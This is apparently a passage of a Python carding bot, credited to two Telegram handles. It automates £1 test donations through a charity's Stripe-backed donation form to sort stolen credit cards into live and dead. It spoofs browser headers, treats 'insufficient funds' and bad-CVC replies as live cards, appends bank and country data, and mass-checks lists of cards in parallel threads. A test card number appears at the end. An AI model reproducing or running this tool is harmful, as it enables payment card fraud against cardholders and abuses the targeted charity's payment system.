🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
                # Check if payment method ID exists (Stripe success)
                if 'id' in response2_json:
                    payment_method_id = response2_json['id']
                    
                    # Step 3: Submit final form with payment method ID (NO COOKIES - separate session)
                    headers3 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-GB,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'content-type': 'application/x-www-form-urlencoded',
                        'dnt': '1',
                        'origin': BASE_URL,
                        'priority': 'u=0, i',
                        'referer': f'{BASE_URL}/donate',
                        'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': user_agent,
                    }
                    
                    params3 = {
                        'payment-mode': 'stripe_checkout',
                        'form-id': '5543',
                    }
                    
                    data3 = {
                        'give-honeypot': '',
                        'give-form-id-prefix': '5543-1',
                        'give-form-id': '5543',
                        'give-form-title': 'Donate Now',
                        'give-current-url': f'{BASE_URL}/donate/',
                        'give-form-url': f'{BASE_URL}/donate/',
                        'give-form-minimum': '1.00',
                        'give-form-maximum': '999999.99',
                        'give-form-hash': 'a915b1de9e',
                        'give-price-id': '1',
                        'give-recurring-logged-in-only': '',
                        'give-logged-in-only': '1',
                        'give_recurring_donation_details': '{"is_recurring":false}',
                        'give-amount': '1.00',
                        'give_stripe_payment_method': payment_method_id,
                        'payment-mode': 'stripe_checkout',
                        'give_title': 'Mr.',
                        'give_first': first_name,
                        'give_last': last_name,
                        'give_company_option': 'no',
                        'give_company_name': '',
                        'give_email': EMAIL,
                        'give_anonymous_donation': '1',
                        'give_comment': '',
                        'card_name': f"{first_name[0]}{last_name[0]}".lower(),
                        'give_validate_stripe_payment_fields': '1',
                        'give_gift_check_is_billing_address': 'yes',
                        'give_gift_aid_address_option': 'billing_address',
                        'give_gift_aid_card_first_name': '',
                        'give_gift_aid_card_last_name': '',
                        'give_gift_aid_billing_country': 'GB',
                        'give_gift_aid_card_address': '',
                        'give_gift_aid_card_address_2': '',
                        'give_gift_aid_card_city': '',
                        'give_gift_aid_card_state': '',
                        'give_gift_aid_card_zip': '',
                        'give_action': 'purchase',
                        'give-gateway': 'stripe_checkout',
                    }
                    
                    try:
                        response3 = r.post(f'{BASE_URL}/donate/', params=params3, headers=headers3, data=data3, timeout=15, verify=False)
                        
                        elapsed_time = time.time() - start_time
                        
                        # Extract actual response message from final site response
                        final_response_msg = None
                        try:
                            # Try to parse as JSON
                            try:
                                response3_json = response3.json()
                                final_response_msg = extract_error_message(response3_json, response3.text)
                            except:
                                # Not JSON, extract from HTML/text
                                final_response_msg = extract_error_message({}, response3.text)
                        except Exception as e:
                            final_response_msg = response3.text[:200] if hasattr(response3, 'text') else "No response"
                        
                        # Check if response indicates success or error
                        response_lower = final_response_msg.lower() if final_response_msg else ""
                        response_text_lower = response3.text.lower()
                        
                        # SPECIAL CASE: Check for live card indicators (these are APPROVED)
                        live_card_indicators = [
                            "your card's security code is incorrect",
                            "security code is incorrect",
                            "your card has insufficient funds",
                            "insufficient funds",
                            "card has insufficient funds"
                        ]
                        has_live_card = any(indicator in response_lower or indicator in response_text_lower for indicator in live_card_indicators)
                        
                        # PRIORITY 1: Check for give_error div (definitive error indicator)
                        has_give_error = 'give_error' in response_text_lower or 'give_notice' in response_text_lower
                        
                        # PRIORITY 2: Check for specific error phrases (must check these first, but exclude live card indicators)
                        specific_error_phrases = [
                            'issue with your donation', 'card was declined', 'card number is incorrect',
                            'card declined', 'your card was declined', 'your card has been declined',
                            'contact your card issuer', 'check your payment method', 'payment method',
                            'transaction failed', 'payment failed', 'donation failed'
                        ]
                        has_specific_error = any(phrase in response_lower or phrase in response_text_lower for phrase in specific_error_phrases)
                        
                        # PRIORITY 3: Check for general error indicators (but not insufficient funds or security code)
                        general_error_indicators = [
                            'declined', 'failed', 'error', 'invalid', 'denied', 
                            'expired', 'incorrect', 'unauthorized', 'rejected'
                        ]
                        has_general_error = any(indicator in response_lower or indicator in response_text_lower for indicator in general_error_indicators)
                        # Exclude "insufficient funds" and "security code" from general errors
                        if 'insufficient funds' in response_lower or 'security code' in response_lower:
                            has_general_error = False
                        
                        # PRIORITY 4: Check for success indicators (comprehensive list)
                        success_indicators = [
                            'donation successful', 'donation received', 'donation complete',
                            'payment successful', 'payment received', 'payment complete',
                            'payment confirmed', 'transaction successful', 'transaction complete',
                            'thank you for your donation', 'your donation has been received',
                            'your donation has been processed', 'successfully processed',
                            'donation processed', 'payment processed', 'charged successfully',
                            'thank you', 'receipt', 'confirmation'
                        ]
                        has_success = any(indicator in response_lower or indicator in response_text_lower for indicator in success_indicators)
                        
                        # Check redirect (success usually redirects away from donate page)
                        is_redirect = response3.status_code in [301, 302, 303, 307, 308] or '/donate/' not in response3.url.lower()
                        
                        # DECISION LOGIC: Live card indicators first, then error, then success
                        
                        # SPECIAL: Live card indicators = APPROVED
                        if has_live_card:
                            # Extract the actual message
                            live_msg = final_response_msg if final_response_msg and final_response_msg != "Payment failed" else "Live card"
                            return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {live_msg} ✅
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 1 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                        # If we have give_error div OR specific error phrases, it's definitely an error
                        elif has_give_error or has_specific_error:
                            # Extract the actual error message (clean extraction)
                            error_msg = final_response_msg if final_response_msg and final_response_msg != "Payment failed" else "Card declined"
                            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                        # If we have success indicators AND no errors, it's success
                        elif has_success and not has_general_error:
                            # Success - show "Charged" and also the site message
                            if 'donation successful' in response_lower or 'donation successful' in response_text_lower:
                                # Extract the actual success message
                                success_msg = final_response_msg if final_response_msg and final_response_msg != "Payment failed" else "Donation successful"
                                display_msg = f"Charged £1.00 | {success_msg}"
                            else:
                                # Other success indicators
                                success_msg = final_response_msg if final_response_msg and final_response_msg != "Payment failed" else "Charged £1.00"
                                if any(word in success_msg.lower() for word in ['donation', 'successful', 'charged', 'thank', 'received', 'complete', 'confirmed']):
                                    display_msg = f"Charged £1.00 | {success_msg}"
                                else:
                                    display_msg = "Charged £1.00"
                            
                            return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {display_msg} ✅
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 1 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                        # If redirected and no errors, likely success
                        elif is_redirect and not has_general_error:
                            success_msg = final_response_msg if final_response_msg and final_response_msg != "Payment failed" else "Charged £1.00"
                            display_msg = f"Charged £1.00 | {success_msg}" if success_msg != "Charged £1.00" else "Charged £1.00"
                            return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {display_msg} ✅
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 1 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                        else:
                            # Ambiguous or has general errors - default to declined
                            error_msg = final_response_msg if final_response_msg and final_response_msg != "Payment failed" and len(final_response_msg) > 10 else "Card declined"
                            return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    except requests.exceptions.Timeout:
                        elapsed_time = time.time() - start_time
                        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request timeout (Final submission) ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    except requests.exceptions.RequestException as e:
                        elapsed_time = time.time() - start_time
                        return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error (Final submission): {str(e)[:100]} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    # No ID and no error - unusual response
                    error_msg = extract_error_message(response2_json, response2.text)
                    final_msg = error_msg
                    elapsed_time = time.time() - start_time
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_msg} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                
            except Exception as e:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Error parsing Stripe response: {str(e)[:100]} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)} ❌
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    # Final fallback
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe 1 £

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stp(cc_lines):
    """Mass check function for multiple cards with threading"""
    results = []
    lock = threading.Lock()
    
    def process_card(cc_line):
        result = check_card_stp(cc_line)
        with lock:
            results.append(result)
        time.sleep(0.5)  # Small delay between checks
    
    threads = []
    for cc_line in cc_lines:
        thread = threading.Thread(target=process_card, args=(cc_line,))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    return results

if __name__ == "__main__":
    # Test single card
    test_card = "4833120124556326|02|29|050"
    result = check_card_stp(test_card)
    print(result)
